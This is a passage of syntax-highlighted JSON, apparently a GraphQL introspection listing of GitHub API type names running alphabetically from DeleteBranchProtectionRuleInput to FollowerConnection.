&#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteBranchProtectionRuleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteBranchProtectionRulePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDeploymentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDeploymentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteEnvironmentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteEnvironmentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIpAllowListEntryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIpAllowListEntryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssueCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssueCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectNextItemInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectNextItemPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteRefInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteRefPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DemilestonedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DependencyGraphEcosystem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployKey&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployKeyConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployKeyEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Deployment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentEnvironmentChangedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRuleConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRuleEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRuleType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentRequestConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentRequestEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReview&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewerEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatus&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatusConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatusEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiffSide&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DisablePullRequestAutoMergeInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DisablePullRequestAutoMergePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DisconnectedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Discussion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCategory&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCategoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCategoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissPullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissPullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissRepositoryVulnerabilityAlertInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissRepositoryVulnerabilityAlertPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DraftPullRequestReviewComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DraftPullRequestReviewThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnablePullRequestAutoMergeInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnablePullRequestAutoMergePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Enterprise&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseBillingInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseDefaultRepositoryPermissionSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseEnabledDisabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseEnabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseIdentityProvider&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMember&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMembersCanCreateRepositoriesSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMembersCanMakePurchasesSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOrganizationMembershipConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOrganizationMembershipEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOutsideCollaboratorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOutsideCollaboratorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOwnerInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterprisePendingMemberInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterprisePendingMemberInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseRepositoryInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseRepositoryInfoConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseRepositoryInfoEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccount&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmail&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUpload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadSyncState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccount&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccountConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccountEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccountMembershipRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserDeployment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Environment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnvironmentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnvironmentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentity&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentityConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentityEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentitySamlAttributes&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentityScimAttributes&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileAddition&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileChanges&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileDeletion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileViewedState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Float&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowUserInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowUserPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    